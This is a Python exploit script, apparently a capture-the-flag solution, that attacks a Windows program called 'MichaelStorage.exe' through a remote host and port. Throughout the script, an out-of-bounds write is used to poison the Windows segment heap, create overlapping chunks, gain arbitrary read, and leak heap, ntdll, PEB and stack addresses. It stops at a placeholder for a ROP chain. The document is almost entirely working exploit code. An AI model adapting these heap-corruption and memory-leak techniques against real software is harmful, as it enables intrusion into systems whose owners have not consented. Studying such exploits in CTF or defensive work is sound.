import os, ctypes
from pwintools import *
from pdbparse.symlookup import Lookup

def inject(pe, sym, name):
    if name not in pe.symbols:
        pe.symbols[name] = next(
            sym.locs[base, limit][sym.names[base, limit].index(name)]
            for base, limit in sym.addrs
            if name in sym.names[base, limit]
        )

binary = PE(r'.\MichaelStorage.exe')
ntdll = PE(r'.\dll\ntdll.dll')
ntdll_sym = Lookup([(r'.\dll\ntdll.pdb', 0)])
inject(ntdll, ntdll_sym, 'TlsExpansionBitMap')
kernel32 = PE(r'.\dll\kernel32.dll')

os.environ["_NO_DEBUG_HEAP"] = "1"

DEBUG = False
if DEBUG:
    p = Process('.\MichaelStorage.exe')
    binary.base = 0x00007FF763FD0000
else:
    p = Remote('52.198.180.107', 56746)
    p.timeout = 5000

def start_debug():
    if DEBUG:
        p.timeout = 10000000
        p.spawn_debugger(x96dbg = True, sleep = 3)

def menu(sel):
    p.recvuntil('Your choice: ')
    p.sendline(str(sel))

def alloc(_type, size):
    menu(1)
    p.recvuntil('Type of storage:')
    p.sendline(str(_type))
    p.recvuntil('Size:')
    p.sendline(str(size))
    p.recvuntil('done !')

def setv(_type, store_idx, index=None, data=None):
    menu(2)
    p.recvuntil('Storage index:')
    p.sendline(str(store_idx))
    if _type in [0, 1]:  # int32 array
        assert isinstance(data, (int, long))
        p.recvuntil('Index:')
        p.sendline(str(index))
        p.recvuntil('Value:')
        p.sendline(str(data))
    elif _type == 2:
        assert isinstance(data, (str, bytes, bytearray))
        p.recvuntil('Index:')
        p.sendline(str(index))
        p.recvuntil('Value:')
        p.send(data)
    elif _type == 3:
        assert isinstance(data, (str, bytes, bytearray))
        p.recvuntil('Size:')
        p.sendline(str(len(data)))
        p.recvuntil('Value:')
        p.send(data)
    else:
        assert False

def getv(store_idx):
    menu(3)
    p.recvuntil('Storage index:')
    p.sendline(str(store_idx))
    p.recvuntil('Value:')
    return p.recvuntil('\r\n*****************************', drop=True)

def destroy(store_idx):
    menu(4)
    p.recvuntil('Storage index:')
    p.sendline(str(store_idx))

MASK64 = (1 << 64) - 1
MASK32 = (1 << 32) - 1

def signed64(val):
    return ctypes.c_longlong(val & MASK64).value

def signed32(val):
    return ctypes.c_int(val & MASK32).value

def forceneg(val):
    return signed64(val | (1 << 63))

# hHeap offset: MichaelStorage.0+0x5630

log.info('init alloc')

alloc(1, 1)       # 0, 00000239cad02050
alloc(2, 0x20000) # 1, 00000239cad13010
alloc(3, 0x20000) # 2, 00000239cad03080 (00000239CAD34010)

# st_lst offset: MichaelStorage.0+5640

log.info('poison backend')

def RELW(addr, val):
    setv(1, 0, forceneg((addr - 0x02058) // 8), signed64(val))

PAGECNT = 0x42
RELW(0x00278, u64('\x03\x01\x00\x00' + p16(~PAGECNT & 0xffff) + '\x04' + chr(PAGECNT)))
RELW(0x00680, 0)
for i in range(0x21, PAGECNT):
    RELW(0x00278 + 0x20*i, u64('\x01\x01\x00\x00' + p32(i)[::-1]))

log.info('get overlap')

destroy(1)

alloc(0, 0x1f000 // 4)  # 1
alloc(0, (0xef50 - 0x10) // 4)  # 3

alloc(2, 0x2010 - 0xa0)  # 4, 0x32080 ~ 0x33ff0
alloc(2, 0x10)  # 5
alloc(2, 0x10)  # 6
alloc(2, 0x10)  # 7
alloc(3, 0x10000)  # 8, ptr @ 0x340e8
destroy(7)
destroy(5)

log.info('let the leaking begin!')

seg_base = u64(getv(2).ljust(8, '\x00')) - 0x44118
assert seg_base & 0xfffff == 0
log.success('_HEAP_PAGE_SEGMENT: {:016x}'.format(seg_base))

def AAR(addr):
    RELW(0x340e8, addr)
    return u64(getv(8).ljust(8, '\x00'))

heap_base = AAR(seg_base) - 0x148
assert heap_base & 0xffff == 0
log.success('_SEGMENT_HEAP: {:016x}'.format(heap_base))

diff = AAR(heap_base + 0x370) - 0x120780
assert diff & 0xffff in range(0, 0xEE8-0x780)
ntdll.base = diff & (MASK64 - 0xffff)
log.success('ntdll: {:016x}'.format(ntdll.base))

peb = AAR(ntdll.base + ntdll.symbols['TlsExpansionBitMap'] + 8) - 0x240
assert peb & 0xfff == 0
log.success('PEB: {:016x}'.format(peb))

teb = peb + 0x1000
log.info('TEB: {:016x}'.format(teb))

stackbase = 0
stacklimit = 0
for i in reversed(range(6)):
    stackbase  = (stackbase << 8) | (AAR(teb + 8 + i) & 0xff)
    stacklimit = (stacklimit << 8) | (AAR(teb + 0x10 + i) & 0xff)
assert stackbase & 0xffff == 0 and stacklimit & 0xfff == 0
log.success('StackBase:  {:016X}'.format(stackbase))
log.success('StackLimit: {:016X}'.format(stacklimit))

#start_debug()

## ROP or anything :)

p.interactive()